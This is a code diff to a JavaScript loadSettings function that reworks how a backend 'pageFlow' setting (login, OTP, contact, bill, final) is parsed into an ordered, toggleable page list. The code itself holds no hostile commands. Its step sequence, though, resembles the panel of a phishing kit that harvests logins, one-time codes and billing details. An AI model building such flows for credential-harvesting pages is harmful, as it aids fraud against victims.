@@ -111,18 +111,40 @@ async function loadSettings() {
     
     console.log(data.pageFlow); 
 
-    // Normalize backend pageFlow
-    pageFlowConfig = data.pageFlow || {
-      "1": { page: "login", enabled: true },
-      "2": { page: "otp", enabled: true },
-      "3": { page: "contact", enabled: true },
-      "4": { page: "bill", enabled: true },
-      "5": { page: "final", enabled: true }
-    };
+    const rawFlow = data.pageFlow || {
+	  "1": { page: "login",   enabled: true },
+	  "2": { page: "otp",     enabled: true },
+	  "3": { page: "contact", enabled: true },
+	  "4": { page: "bill",    enabled: true },
+	  "5": { page: "final",   enabled: true }
+	};
 
-    pageOrder = Object.keys(pageFlowConfig)
-      .sort((a, b) => Number(a) - Number(b))
-      .map(k => pageFlowConfig[k].page);
+	pageFlowConfig = {};
+	pageOrder = [];
+	
+	Object.keys(rawFlow)
+	  .sort((a, b) => Number(a) - Number(b))
+	  .forEach(step => {
+	    const val = rawFlow[step];
+	
+	    // New format
+	    if (val && typeof val === "object" && "page" in val) {
+	      pageFlowConfig[step] = {
+	        page: val.page,
+	        enabled: !!val.enabled
+	      };
+	      pageOrder.push(val.page);
+	    }
+	
+	    // Old format
+	    else if (typeof val === "string") {
+	      pageFlowConfig[step] = {
+	        page: val,
+	        enabled: val !== "0"
+	      };
+	      pageOrder.push(val);
+	    }
+	  });
 
     renderPageList();
   } catch (e) {
